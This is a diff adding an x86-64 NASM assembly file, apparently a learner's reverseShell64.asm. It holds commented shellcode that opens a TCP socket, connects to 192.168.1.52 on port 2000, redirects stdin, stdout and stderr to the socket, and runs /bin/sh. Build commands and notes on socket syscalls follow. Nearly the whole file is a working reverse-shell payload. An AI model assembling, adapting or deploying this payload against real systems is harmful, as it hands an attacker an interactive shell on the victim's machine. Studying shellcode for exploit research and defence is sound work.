@@ -1,0 +1,151 @@
+BITS 64						;inportant if assemble with only nasm filename
+						;if not, it ll treat it as 32 bit
+    xor rax,rax					;use of eax, abx, etc 32 bit i still allowed
+    xor rdi,rdi
+    xor rsi,rsi
+    xor rdx,rdx
+    xor r8,r8
+						;arguments in 64 are passed in order of
+						;rdi, rsi, rdx(second return register), rcx(integer) r8, r9
+    ; Socket
+    ; Function prototype:
+    ;   int socket(int domain, int type, int protocol)
+						;int socket( 2, 1, 6 )
+    push 0x2
+    pop rdi					;first argument = 2
+    push 0x1
+    pop rsi					;second argument = 1
+    push 0x6
+    pop rdx					;third argument = 6
+    push 0x29
+    pop rax					;call socket = 41
+    syscall
+    mov r8,rax					;save fd to r8 ***************8
+     
+    ; Connect
+    ; Function protoype:
+    ;   int connect(int sockfd, const struct sockaddr *addr,
+    ;       socklen_t addrlen)
+    ; int conect(fd, [ 2, port, IP ], 16)
+			;//IPv4 uses sockaddr_in socket address struct 16 byte long including
+			;//2 bytes for family
+			;//2 bytes for port
+			;//4 bytes for IP address
+			;//8 byte padding 
+			;//__|__|____|________
+    xor rsi,rsi
+    xor r10,r10
+    push r10							;push r10on stack 0000000000000000
+    mov byte [rsp],0x2						;r10 now -> 0000000000000002
+    mov word [rsp+0x2],0xd007					;r10 now -> 00000000d0070002
+								;port 2000 = 0x7d0, so in little indian = 0xd007
+    mov dword [rsp+0x4],0x3401a8c0				;r10 now -> 3401a8c0d0070002
+								;192.168.1.52: c0a80134, so little indian = 0x3401a8c0 
+								;have rsi points to sockaddr struct
+    mov rsi, rsp						;second arg has struct sockaddr
+    push byte 0x10
+    pop rdx							;third argument (rdx) = 16
+    push r8
+    pop rdi							;first argument(rdi) = fd*******
+    push 0x2a							;42 conect
+    pop rax
+    syscall
+
+    ; Dup2
+    ; Function prototype:
+    ;   int dup2(int oldfd, int newfd)
+    ;making fd the new stdin/out/err
+
+    xor rsi,rsi
+    push 0x3
+    pop rsi							;second arg = 3
+								;first argument rdi still = fd
+								;so dup2(rdi, rsi)
+								;dup2(fd, stdin/out/err)
+    xor rcx, rcx
+    mov cl, 0x3							;set loop counter rcx to 3, will do 3 loops
+loop:
+    dec rsi							;decrease rsi to 2,1,0
+    push 0x21							;dup2 syscall = 33
+    pop rax
+    syscall
+    jne loop
+							;jump to doop if not equal 0
+     
+    ; Execve
+    ; Function descriptor:
+    ;   int execve(const char *fn, char *const argv[],
+    ;       char *const envp[])
+    ;execve("/bin/sh", NULL, NULL)
+
+    xor rdi,rdi
+    push rdi
+    push rdi
+    pop rsi							;second arg = null
+    pop rdx							;thied arg = null
+    mov rdi,0x68732f6e69622f2f					;making first arg = hs/nib//
+    shr rdi,0x8							;removing extra / by shift right 8 bit = hs/nib/
+    push rdi
+    push rsp
+    pop rdi							;making first arg(rdi) points to string"/bin/sh"
+    push 0x3b							;59 = execve
+    pop rax
+    syscall
+
+;assemble with nasm reverseShell64.asm
+;follow with usual hexdump: hexdump -d reverseShell64
+
+;if want an executable
+;nasm -f elf64 reverseShell64.asm
+;ld -m elf_x86_64 reverseShell64.o -o reverseShell64.x
+
+;64 bit syscall at
+;cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h
+
+							;Socket stuff
+
+	;Socket(int domain, int type, int protocol)
+;Used to create a new socket, returns a file descriptor for the socket or
+;-1 on error.
+
+	;connect(int fd, struct sockaddr *remote_host, socklen_t addr_length)
+;Connects a socket (described by file descriptor fd) to a remote host.
+;Returns 0 on success and -1 on error.
+
+	;bind(int fd, struct sockaddr *local_addr, socklen_t addr_length)
+;Binds a socket to a local address so it can listen for incoming connections.
+;Returns 0 on success and -1 on error.
+
+	;listen(int fd, int backlog_queue_size)
+;Listens for incoming connections and queues connection requests up to
+;backlog_queue_size. Returns 0 on success and -1 on error.
+
+	;accept(int fd, sockaddr *remote_host, socklen_t *addr_length)
+;Accepts an incoming connection on a bound socket. The address infor-
+;mation from the remote host is written into the remote_host structure and
+;the actual size of the address structure is written into *addr_length. This
+;function returns a new socket file descriptor to identify the connected
+;socket or -1 on error.
+
+;send(int fd, void *buffer, size_t n, int flags)
+;Sends n bytes from *buffer to socket fd; returns the number of bytes sent
+;or -1 on error.
+
+	;recv(int fd, void *buffer, size_t n, int flags)
+;Receives n bytes from socket fd into *buffer; returns the number of bytes
+;received or -1 on error.
+
+
+
+;//AF_INET address sockaddr_in struct  can be view at
+;// cat /usr/include/netinet/in.h | grep -A5 sockaddr_in
+;//socket function variable
+;//can be refernced at  cat /usr/include/x86_64-linux-gnu/bits/socket.h
+
+;//IPv4 uses sockaddr_in socket address struct 16 byte long including
+;//2 bytes for family
+;//2 bytes for port
+;//4 bytes for IP address
+;//8 byte padding 
+;//__|__|____|________
+
